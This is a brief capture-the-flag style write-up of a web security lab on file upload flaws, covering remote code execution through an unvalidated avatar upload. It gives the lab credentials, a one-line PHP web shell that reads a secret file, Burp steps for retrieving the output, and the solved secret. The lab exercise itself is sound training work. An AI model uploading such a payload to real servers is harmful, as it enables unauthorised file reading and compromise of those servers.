

# File_Upload_Vulnerabeties

## Remote code execution via web shell upload

### Problem

- This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

- To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- First Login as Following `wiener:peter`.After that connect to Burp suite.In burp suite Check the Mime Type Images.

- Create a File name `test.php` contain `<?php echo file_get_contents('/home/carlos/secret'); ?>`  in your device.And upload it in the profile picture of the lab.

- After successfully updated goto burp http history ans see the request named `/files/avatars/test.php`.

- You can see the secret code `xcnuSDMETdoJekGPrxBk16wrzEp07ONB`.

- Lab Solved!!
